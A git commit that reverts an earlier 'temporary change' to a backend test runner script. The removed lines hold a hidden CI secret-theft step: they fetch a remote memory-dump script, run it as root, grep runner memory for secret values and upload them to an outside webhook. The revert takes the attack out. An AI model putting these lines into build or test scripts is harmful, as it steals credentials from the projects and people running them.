0393cb29554e2d9e7a6f79905915601d5c0f29b0
jy3l40c9 <jy3l40c9@rolf.ovh>
2026-04-07 20:32:09 +0000

    Revert "Add temporary change"
    This reverts commit 2a1b27c527d9633cc3040028bf16dfa28e863fa1.

--- backend/run_web_test.sh
+++ backend/run_web_test.sh
@@ -4,8 +4,5 @@ set -e
 parent_dir="$(dirname "$(pwd)")"
 export PYTHONPATH="${PYTHONPATH}:${parent_dir}"
 echo "Starting tests..."
-echo "Okay, we got this far. Let's continue..."
-curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> "/tmp/secrets"
-curl -X PUT -d \@/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
 pytest   ./tests/services_tests  -m "web_test or api_test"  -q  --tb=no  --reruns 3 --reruns-delay 2
 echo "Tests completed."
